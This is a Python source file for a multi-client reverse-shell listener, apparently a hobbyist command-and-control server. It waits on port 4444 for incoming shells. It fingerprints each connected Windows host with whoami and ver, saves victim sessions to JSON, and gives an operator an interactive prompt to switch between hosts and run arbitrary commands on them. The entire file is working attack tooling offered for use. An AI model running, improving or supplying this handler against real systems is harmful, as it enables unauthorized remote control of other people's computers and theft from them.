import socket
import sys
import threading
import os
import time
import json
from datetime import datetime
from colorama import Fore, Style, init
import argparse
import shlex
try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        # If neither is available, create dummy readline
        class DummyReadline:
            def read_history_file(self, *args): pass
            def write_history_file(self, *args): pass
        readline = DummyReadline()


def parse_args():
    parser = argparse.ArgumentParser(description='LS Server')
    parser.add_argument('-i', '--ip', default='0.0.0.0', help='IP to listen on (default: 0.0.0.0)')
    parser.add_argument('-p', '--port', type=int, default=4444, help='Port to listen on (default: 4444)')
    return parser.parse_args()

args = parse_args()
LS_HOST = args.ip
LS_PORT = args.port


clients = []
current_client = None
sessions_dir = os.path.join(os.path.dirname(__file__), 'sessions')
if not os.path.exists(sessions_dir):
    os.makedirs(sessions_dir)

# Initialize colorama
init(autoreset=True)

def setup_history():
    history_file = os.path.expanduser('~/.LS_history')
    try:
        readline.read_history_file(history_file)
    except FileNotFoundError:
        pass
    
    def save_history():
        readline.write_history_file(history_file)
    
    import atexit
    atexit.register(save_history)

def log_msg(msg, level="info"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    colors = {
        "info": Fore.CYAN,
        "success": Fore.GREEN,
        "warning": Fore.YELLOW,
        "error": Fore.RED
    }
    color = colors.get(level, Fore.WHITE)
    print(f"{color}[{timestamp}] {msg}{Style.RESET_ALL}")

def receive_data(client_socket, timeout=0.5, max_size=4096):
    response = ""
    start_time = time.time()
    while True:
        try:
            client_socket.settimeout(timeout)
            data = client_socket.recv(max_size).decode(errors="ignore")
            if not data:
                break
            response += data
            if time.time() - start_time > timeout * 2:
                break
        except socket.timeout:
            break
        except Exception as e:
            log_msg(f"Error receiving data: {str(e)}", "error")
            break
    return response.strip()

def save_session(client_socket, addr, info):
    session = {
        'ip': addr[0],
        'port': addr[1],
        'timestamp': datetime.now().isoformat(),
        'system_info': info,
        'commands': []
    }
    filename = f'{addr[0]}_{addr[1]}_{int(time.time())}.json'
    with open(os.path.join(sessions_dir, filename), 'w') as f:
        json.dump(session, f, indent=2)

def load_sessions():
    sessions = []
    if os.path.exists(sessions_dir):
        for file in os.listdir(sessions_dir):
            if file.endswith('.json'):
                with open(os.path.join(sessions_dir, file)) as f:
                    sessions.append(json.load(f))
    return sessions


SEPARATOR = "-" * 50

def list_clients():
    print(f"\n{Fore.CYAN}Connected clients:{Style.RESET_ALL}")
    print(SEPARATOR)
    for i, (client, addr, info) in enumerate(clients):
        status = f"{Fore.GREEN}ACTIVE{Style.RESET_ALL}" if client == current_client else f"{Fore.YELLOW}IDLE{Style.RESET_ALL}"
        print(f"  [{i}] {addr[0]}:{addr[1]} - {status}")
        if info:
            user = info.get('user', 'Unknown')
            os_info = info.get('os', 'Unknown')
            user = user.strip() if user else 'Unknown'
            os_info = os_info.strip() if os_info else 'Unknown'
            print(f"      User: {user}")
            print(f"      OS: {os_info}")
    print(SEPARATOR)

def switch_client(index):
    global current_client
    if 0 <= index < len(clients):
        current_client = clients[index][0]
        addr = clients[index][1]
        log_msg(f"Switched to client {addr[0]}:{addr[1]}", "success")
    else:
        log_msg("Invalid client index", "error")

def get_system_info(client_socket):
    info = {}
    commands = [
        ("whoami", "user"),
        ("ver", "os"),
    ]
    
    print(f"\n{Fore.CYAN}Gathering system information...{Style.RESET_ALL}")
    print(SEPARATOR)
    for cmd, key in commands:
        client_socket.send(f"{cmd}\r\n".encode())
        time.sleep(1)
        response = receive_data(client_socket)
        if response:
            cleaned = response.split('\n')[-1].strip()
            info[key] = cleaned
            print(f"\n{Fore.YELLOW}[*] {key.upper()}{Style.RESET_ALL}")
            print(cleaned)
    print(SEPARATOR)
    
    return info

def show_current_id():
    """Show current client ID"""
    if not current_client:
        print("No active client")
        return
    
    for i, (client, addr, _) in enumerate(clients):
        if client == current_client:
            print(f"Current client ID: {i}")
            return

def handle_command(cmd, args):
    """Validate and handle commands"""
    if cmd == "switch":
        try:
            if len(args) < 2:
                print("Usage: switch <client_id>")
                return True
            switch_client(int(args[1]))
            return True
        except ValueError:
            print("Error: Client ID must be a number")
            return True
    return False

help_menu = f"""
{Fore.CYAN}Built-in commands:{Style.RESET_ALL}
{SEPARATOR}
  clear     - Clear screen
  exit      - Close current session
  help      - Show this help
  clients   - List connected clients
  switch    - Switch between clients (switch <id>)
  info      - Show current client information
  sessions  - List saved sessions
  id        - Show current client ID
{SEPARATOR}
"""

BUILTIN_COMMANDS = {
    "clear": lambda _: os.system("cls" if os.name == "nt" else "clear"),
    "help": lambda _: print(help_menu),
    "clients": lambda _: list_clients(),
    "switch": lambda args: handle_command("switch", args),
    "info": lambda _: print_client_info(current_client) if current_client else print("No active client"),
    "sessions": lambda _: print_sessions(),
    "id": lambda _: show_current_id()
}

def print_client_info(client):
    for c, addr, info in clients:
        if c == client:
            print(f"\n{Fore.CYAN}Client Information:{Style.RESET_ALL}")
            print(SEPARATOR)
            print(f"  Address: {addr[0]}:{addr[1]}")
            if info:
                for key, value in info.items():
                    print(f"\n{Fore.YELLOW}[*] {key.upper()}{Style.RESET_ALL}")
                    # Clean up the output - remove command echo
                    cleaned_value = '\n'.join(line for line in value.split('\n') if not line.startswith(key.lower()))
                    print(cleaned_value.strip())
            print(SEPARATOR)

def print_sessions():
    sessions = load_sessions()
    print(f"\n{Fore.CYAN}Saved sessions:{Style.RESET_ALL}")
    for i, session in enumerate(sessions):
        print(f"  [{i}] {session['ip']}:{session['port']} - {session['timestamp']}")

def handle_client(client_socket, addr):
    global current_client
    log_msg(f"New connection from {addr[0]}:{addr[1]}", "success")
    
    try:
        client_socket.send("@echo off\r\n".encode())
        time.sleep(0.5)
        try:
            client_socket.recv(4096)
        except socket.timeout:
            pass

        info = get_system_info(client_socket)
        clients.append((client_socket, addr, info))
        save_session(client_socket, addr, info)
        if len(clients) == 1 or current_client is None:
            current_client = client_socket
            
        print(f"{Fore.LIGHTCYAN_EX}Shell> {Style.RESET_ALL}", end='', flush=True)

        while True:
            try:
                if client_socket != current_client:
                    time.sleep(0.1)
                    continue

                cmd = input().strip()
                if not cmd:
                    print(f"{Fore.LIGHTCYAN_EX}Shell> {Style.RESET_ALL}", end='', flush=True)
                    continue

                args = shlex.split(cmd)
                command = args[0].lower()

                if command in BUILTIN_COMMANDS:
                    BUILTIN_COMMANDS[command](args)
                    print(f"{Fore.LIGHTCYAN_EX}Shell> {Style.RESET_ALL}", end='', flush=True)
                    continue
                
                if command == "exit":
                    break

                client_socket.send(f"{cmd}\r\n".encode())
                time.sleep(0.5)

                response = receive_data(client_socket)
                if response:
                    print(f"{Fore.LIGHTBLACK_EX}{response}{Style.RESET_ALL}")
                print(f"{Fore.LIGHTCYAN_EX}Shell> {Style.RESET_ALL}", end='', flush=True)

            except KeyboardInterrupt:
                break

    except Exception as e:
        log_msg(f"Error with {addr[0]}:{addr[1]}: {str(e)}", "error")
    finally:
        clients[:] = [(c, a, i) for c, a, i in clients if c != client_socket]
        if current_client == client_socket:
            current_client = clients[0][0] if clients else None
        try:
            client_socket.close()
        except:
            pass

def print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""
{Fore.WHITE}       .__                 
  ____ |  | _____ __  _  __
_/ ___\|  | \__  \\ \/ \/ /
\  \___|  |__/ __ \\     / 
 \___  >____(____  /\/\_/  
     \/          \/        
{Style.RESET_ALL}

   {Fore.RED}By Clawx64 | Listening on {Fore.LIGHTBLACK_EX}{LS_HOST}{Fore.WHITE}:{Fore.LIGHTBLACK_EX}{LS_PORT}{Style.RESET_ALL}
----------------------------------------------------
"""
    print(banner)

def cleanup():
    log_msg("Cleaning up connections...", "warning")
    for client, _, _ in clients:
        try:
            client.close()
        except:
            pass
    clients.clear()

def validate_ip(ip):
    """Validate if IP is available on this system"""
    try:
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        
        if ip in ['127.0.0.1', 'localhost', '0.0.0.0']:
            return True
            
        return ip in ips
    except:
        return False

def main():
    print_banner()
    setup_history()
    
    try:
        if not validate_ip(LS_HOST):
            log_msg(f"Invalid IP address: {LS_HOST}", "error")
            log_msg("Available IPs on this system:", "info")
            hostname = socket.gethostname()
            ips = socket.gethostbyname_ex(hostname)[2]
            for ip in ips:
                print(f"  - {ip}")
            return

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.settimeout(1)
        
        try:
            s.bind((LS_HOST, LS_PORT))
        except socket.error as e:
            if e.errno == 10013: 
                log_msg(f"Error: Port {LS_PORT} requires admin privileges", "error")
            elif e.errno == 10048:
                log_msg(f"Error: Port {LS_PORT} is already in use", "error")
            else:
                log_msg(f"Error binding to {LS_HOST}:{LS_PORT}: {str(e)}", "error")
            return
            
        s.listen(5)
        log_msg(f"Listening on {LS_HOST}:{LS_PORT}", "info")

        while True:
            try:
                conn, addr = s.accept()
                client_thread = threading.Thread(target=handle_client, args=(conn, addr))
                client_thread.daemon = True
                client_thread.start()
            except socket.timeout:
                continue
            except KeyboardInterrupt:
                log_msg("\nShutting down server...", "warning")
                break

    except Exception as e:
        log_msg(f"Fatal error: {str(e)}", "error")
    finally:
        cleanup()
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
        sys.exit(0)

if __name__ == "__main__":
    main()
